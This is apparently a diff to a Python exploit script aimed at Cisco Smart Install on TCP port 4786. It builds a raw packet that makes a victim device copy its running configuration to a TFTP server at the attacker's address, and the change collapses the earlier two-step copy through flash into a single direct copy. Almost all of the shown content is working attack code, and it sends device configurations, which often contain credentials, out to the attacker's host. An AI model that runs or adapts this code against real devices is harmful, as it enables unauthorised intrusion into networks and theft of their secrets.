@@ -28,14 +28,18 @@ conn.settimeout(5)
 try:
    conn.connect((victim_ip, 4786))
 
-   c1 = 'copy system:running-config flash:/config.text'
-   c2 = 'copy flash:/config.text tftp://' + attack_ip + '/' + victim_ip + '.conf'
-   c3 = ''
+#   c1 = 'copy system:running-config flash:/config.text'
+#   c2 = 'copy flash:/config.text tftp://' + attack_ip + '/' + victim_ip + '.conf'
+#   c3 = ''
+#   sTcp = '0' * 7 + '1' + '0' * 7 + '1' + '0' * 7 + '800000' + '40800010014' + '0' * 7 + '10' + '0' * 7 + 'fc994737866' + '0' * 7 + '0303f4'
+#   sTcp = sTcp + c1.encode('hex') + '00' * (336 - len(c1))
+#   sTcp = sTcp + c2.encode('hex') + '00' * (336 - len(c2))
+#   sTcp = sTcp + c3.encode('hex') + '00' * (336 - len(c3))
+   c1 = 'copy system:running-config tftp://' + attack_ip + '/' + victim_ip + '.conf'
    sTcp = '0' * 7 + '1' + '0' * 7 + '1' + '0' * 7 + '800000' + '40800010014' + '0' * 7 + '10' + '0' * 7 + 'fc994737866' + '0' * 7 + '0303f4'
    sTcp = sTcp + c1.encode('hex') + '00' * (336 - len(c1))
-   sTcp = sTcp + c2.encode('hex') + '00' * (336 - len(c2))
-   sTcp = sTcp + c3.encode('hex') + '00' * (336 - len(c3))
-
+   sTcp = sTcp + '00' * 336 + '00' * 336
+   
    print('[INFO]: Sending config dumper request to %s ' % victim_ip)
    conn.send(sTcp.decode('hex'))
    conn.close()
